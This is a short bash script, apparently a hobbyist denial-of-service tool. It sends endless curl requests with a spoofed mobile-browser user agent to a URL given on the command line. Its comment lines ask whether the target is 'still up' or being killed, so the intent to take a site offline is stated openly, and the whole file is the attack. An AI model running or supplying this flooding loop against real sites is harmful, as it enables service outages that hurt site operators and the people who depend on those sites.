#!/bin/bash
echo "R3K7|-=-=-=_=l336=_=-=-=-|R3K7"
name=$1
while : 
    do
        curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" --url $name --connect-timeout 2 -s --no-buffer > /dev/null
        N=$((N+1))
        echo "Request #$N is it still up or is my 1337ness killing it?"
done
